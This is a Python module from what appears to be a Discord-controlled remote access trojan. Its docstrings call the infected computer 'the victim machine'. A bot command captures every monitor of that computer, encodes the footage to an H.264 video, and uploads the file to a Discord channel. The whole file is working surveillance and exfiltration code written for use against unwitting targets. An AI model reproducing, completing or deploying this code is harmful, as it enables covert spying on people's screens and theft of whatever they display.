"""Record the screen of the victim machine into a video file.

The frames are grabbed with `mss`, which is fast enough to keep a steady
frame rate, and are encoded into an H.264 video with the ffmpeg binary
that comes with `imageio-ffmpeg`.
"""

import asyncio
import tempfile
import time
from pathlib import Path

import discord
import imageio_ffmpeg
import mss
import numpy as np
from discord.ext import commands
from discord.ext.commands import Context

from src.constants import RECORDING_FPS

# Longest recording that is accepted, longer recordings freeze the runtime.
MAX_RECORDING_SECONDS = 300


def record_screen(
    path: Path, seconds: int, fps: int = RECORDING_FPS
) -> Path:
    """Record the screen into a video file and return the path of the file."""
    with mss.mss() as capture:
        # The first monitor is the area that holds every screen.
        monitor = capture.monitors[0]
        width, height = monitor["width"], monitor["height"]

        writer = imageio_ffmpeg.write_frames(
            str(path),
            (width, height),
            fps=fps,
            codec="libx264",
            pix_fmt_in="rgb24",
            macro_block_size=1,
            # The plugin already writes the pixels as yuv420p.
            output_params=["-preset", "ultrafast"],
        )
        writer.send(None)

        deadline = time.time() + seconds

        try:
            while time.time() < deadline:
                frame = np.asarray(capture.grab(monitor))[:, :, :3]
                # The screen is grabbed in blue, green, red order.
                writer.send(np.ascontiguousarray(frame[:, :, ::-1]))
        finally:
            writer.close()

    return path


async def record_screen_command(
    ctx: Context[commands.Bot], seconds: int = 15
) -> None:
    """Record the screen of the victim and upload the video."""
    seconds = max(1, min(int(seconds), MAX_RECORDING_SECONDS))

    path = Path(tempfile.gettempdir()) / f"screenrecording_{int(time.time())}.mp4"

    await ctx.reply(f"Recording the screen for {seconds} seconds...")

    try:
        await asyncio.to_thread(record_screen, path, seconds)
    except Exception as exc:
        print(f"Screen recording error: {exc}")
        path.unlink(missing_ok=True)
        await ctx.reply(f"The recording failed: {type(exc).__name__}: {exc}")
        return

    try:
        await ctx.send(
            "Screen recording:",
            file=discord.File(str(path), filename="screenrecording.mp4"),
        )
    finally:
        path.unlink(missing_ok=True)
